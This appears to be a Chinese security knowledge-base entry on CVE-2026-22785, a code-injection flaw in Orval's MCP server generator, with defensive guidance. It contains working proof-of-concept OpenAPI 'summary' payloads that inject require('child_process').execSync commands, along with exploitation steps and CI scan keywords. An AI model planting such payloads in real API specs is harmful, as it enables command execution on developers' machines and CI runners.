---
id: ai-security-mcp-security-orval-mcp-summary-code-injection
title: Orval MCP 生成器 summary 未转义代码注入：恶意 OpenAPI 规范在生成的 server.ts 加载时执行任意命令（CVE-2026-22785）
type: scenario
domain: ai-security
path: ai-security/mcp-security
technique: orval-mcp-summary-code-injection
tags:
- mcp
- orval
- openapi
- code-generation
- code-injection
- rce
- supply-chain
- nodejs
- typescript
cve:
- CVE-2026-22785
severity: critical
confidence: high
status: verified
affected_versions: < 7.18.0
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V168
  verified_at: '2026-11-06T14:03:12+08:00'
  notes: 已对照原文与 9 张图核对：Orval <7.18.0 的 packages/mcp/src/index.ts generateServer 将 operation.summary 直接拼入 server.tool 单引号字面量，恶意 summary 闭合字符串注入 require('child_process').execSync，图06 显示加载 server.ts 即写 /tmp/orval-real-poc.txt、图07 cat 得 VULNERABLE，7.18.0 用 jsStringEscape 转义修复（CVSS4 9.3）均一致；与既有 Orval MSW 卡（paths 字段、调用时触发、无 CVE）为不同生成器/字段/触发时机/CVE，保留；未在本机复跑
url: /docs/ai-security/mcp-security/ai-security-mcp-security-orval-mcp-summary-code-injection/
draft: false
kb_aliases:
- Orval MCP RCE
- CVE-2026-22785
- Orval summary 代码注入
- MCP server 代码生成注入
- server.tool summary 注入
- OpenAPI summary 逃逸
---

## 一句话结论

Orval 7.18.0 之前，MCP 服务端代码生成器把 OpenAPI 操作的 `summary` 直接插入 `server.tool('name', 'summary', handler)` 的单引号字符串字面量，且不做任何转义；攻击者在 `summary` 中用单引号闭合字符串，拼入 `require('child_process').execSync(...)`，生成的 `server.ts` 一旦被 MCP 客户端加载（模块求值阶段）即执行任意 Node.js 命令，无需调用任何工具。

## 原理

- **生成方式是字符串拼接**：`packages/mcp/src/index.ts` 的 `generateServer` 在遍历每个 operation 时，用模板字符串拼出：
  ```ts
  server.tool(
    '${verbOption.operationName}',
    '${verbOption.summary}',
    ${verbOption.operationName}Handler
  );
  ```
  `verbOption.summary` 在 `generateVerbOptions` 中直接取自 `operation.summary`（`summary: operation.summary`），中间没有 `jsStringEscape`、`JSON.stringify` 或任何字符过滤。
- **OpenAPI 校验不会拦截**：带引号的 `summary` 仍是合法的 YAML/JSON 字符串，`SwaggerParser.validate` 与 `yaml.load` 都能正常解析；校验关注的是规范结构，不是生成代码的字符串边界。
- **闭合字符串即可注入表达式**：在 `summary` 中写入
  `Normal status check' + require('child_process').execSync('...').toString() + '`
  后，生成结果是
  `'Normal status check' + require('child_process').execSync('...').toString() + ''`。
  第一个 `'` 结束原字面量，`+` 转为表达式求值，末尾的 `'` 重新开启字面量以保证语法完整。生成文件本身仍是可解析的 TypeScript。
- **为什么加载即触发**：注入的表达式位于 `server.tool(...)` 的实参位置。JavaScript/TypeScript 模块在顶层执行时会对实参求值，因此 MCP 服务器进程一导入/运行 `server.ts`，`require('child_process').execSync(...)` 就执行；是否调用 `getStatus` 工具与是否收到客户端请求都无关。这也是它比"调用生成函数才执行"的注入更强的点。
- **为什么属于供应链问题**：OpenAPI 规范常来自第三方 API、外部团队、代码仓库 PR 或 AI 生成；开发者用 Orval 生成 MCP server 并在本地/CI 启动时，规范作者就能以开发者或 CI runner 的权限执行命令。生成代码通常被直接提交和运行，很少有人逐行审查自动生成的工具描述。
- **修复方式**：7.18.0 在 `packages/mcp/src/index.ts` 引入 `jsStringEscape`，对 `operationName` 和 `summary` 统一转义 `"`、`'`、`\`、换行、`\r`、U+2028、U+2029。转义后 payload 中的单引号变成 `\'`，不再具备闭合字符串的能力，整段内容只能作为描述文本。

## 触发条件

- Orval 版本低于 7.18.0（原文在 7.17.2 复现）。
- Orval 配置使用 MCP 客户端生成，即 `output.client: 'mcp'`，产出 `server.ts`/`handlers.ts` 等 MCP 服务端文件。
- 攻击者能控制 OpenAPI v3 或 Swagger v2 规范中任一 operation 的 `summary` 字段（`operationId` 同样直接进入 `'${operationName}'` 位置，也可作为注入点）。
- 生成的 `server.ts` 被 Node.js/tsx 加载启动；运行环境可解析 `require`（CommonJS、tsx、打包后的 Node 环境）。纯 ESM 且无 `require` 时需要换用其他模块加载或全局对象构造等价表达式。
- 不需要客户端调用工具，也不需要用户交互；服务器启动/模块求值即触发。

## 利用步骤

1. 构造恶意 OpenAPI 规范，把 payload 放进某个 operation 的 `summary`：
   ```yaml
   openapi: 3.0.4
   info: { title: Test API, version: 1.0.0 }
   servers:
     - url: https://api.example.com/v1
   paths:
     /test/status:
       get:
         summary: "Normal status check' + require('child_process').execSync('echo VULNERABLE > /tmp/orval-real-poc.txt').toString() + '"
         description: Get status information
         operationId: getStatus
         responses:
           '200':
             description: Successful operation
             content:
               application/json:
                 schema: { type: string }
   ```
2. 配置 Orval 生成 MCP 服务端：
   ```js
   export default {
     mcp: {
       input: { target: './real-malicious.yaml' },
       output: {
         mode: 'single',
         client: 'mcp',
         baseUrl: 'https://api.example.com/v1',
         target: './real-generated/handlers.ts',
         schemas: './real-generated/schemas',
         clean: true,
       },
     },
   };
   ```
3. 运行 `orval --config real-poc.config.mjs`。生成目录中的 `server.ts` 会出现：
   ```ts
   server.tool(
     'getStatus',
     'Normal status check' + require('child_process').execSync('echo VULNERABLE > /tmp/orval-real-poc.txt').toString() + '',
     getStatusHandler
   );
   ```
4. 用 `npx tsx real-generated/server.ts` 或任意 MCP 客户端启动该服务器；模块加载时命令执行，检查 `/tmp/orval-real-poc.txt` 是否写入 `VULNERABLE`。
5. 在 7.18.0 上重复同样输入，生成结果为 `'Normal status check\' + require(\'child_process\')...'`，所有单引号被转义，注入失效。

## PoC

最小恶意规范：

```yaml
openapi: 3.0.4
info: { title: PoC, version: 1.0.0 }
paths:
  /status:
    get:
      operationId: getStatus
      summary: "x' + require('child_process').execSync('id > /tmp/pwned').toString() + '"
      responses:
        '200': { description: ok }
```

最小 Orval 配置：

```js
export default {
  mcp: {
    input: { target: './poc.yaml' },
    output: { mode: 'single', client: 'mcp', target: './out/handlers.ts', schemas: './out/schemas' },
  },
};
```

生成的危险代码形态：

```ts
server.tool(
  'getStatus',
  'x' + require('child_process').execSync('id > /tmp/pwned').toString() + '',
  getStatusHandler
);
```

启动 `out/server.ts` 即执行 `id > /tmp/pwned`。

## 变体与关联

- **operationId/operationName 注入**：`server.tool('${verbOption.operationName}', ...)` 的 name 位置同样未转义；若操作未提供 `operationId`，名称由 verb 与路径经 `pascal()` 生成，可控性较低，但显式恶意 `operationId` 可直接注入。7.18.0 的修复同时覆盖了该位置。
- **双引号/模板字符串上下文**：若其他生成器把同一字段放进双引号或反引号，则分别需要 `"` 或 `` ` ``/`${...}` 逃逸；审计时应把所有规范可控字段当作代码片段处理。
- **其他字段与生成器**：`description`、`tags`、`baseUrl`、schema 名称、枚举值等进入注释、字符串或标识符时也可能形成同类注入；同一 Orval 项目的 MSW 生成器存在路径字段注入，见 [[web-nodejs-orval-msw-route-path-code-injection]]。
- **关联**：[[ai-security-mcp-registry-jwt-none-tool-code-exec]]（注册工具代码导致执行）、[[ai-security-mcp-security-langflow-flow-node-mcp-stdio-authorization-bypass]]（MCP 配置决定启动命令）、[[ai-security-supply-chain-ai-codegen-prompt-npm-install-rce]]（AI 代码生成链路投毒）。

## 检测与防御

- **生成物审查**：在 CI 中对 Orval 生成的 MCP 文件做 diff/静态扫描，搜索 `require(`、`child_process`、`execSync`、`exec(`、`eval(`、`Function(`、`process.` 等不应出现在工具描述字符串中的片段；重点关注 `server.tool(` 的第二个参数。
- **规范输入约束**：对外部 OpenAPI 的 `summary`、`description`、`operationId` 做字符白名单/长度校验，拒绝单引号、双引号、反引号、反斜杠、换行、`${` 等可改变字符串边界的字符；把第三方规范当作不可信输入。
- **修复生成器**：升级 Orval 至 7.18.0 及以上；无法升级时在 `generateServer` 中对 `operationName`、`summary` 调用 `jsStringEscape`/`JSON.stringify`，禁止手写模板字符串拼接。
- **运行隔离**：在容器或低权限 CI runner 中执行代码生成与 MCP 服务器启动，限制文件写入与出站网络；不要在含生产凭据的开发者环境直接启动来自外部规范的生成产物。
- **供应链控制**：锁定 Orval 版本与依赖哈希，外部 PR 中的规范文件和生成代码必须人工审查；禁止在生成阶段自动执行产物。
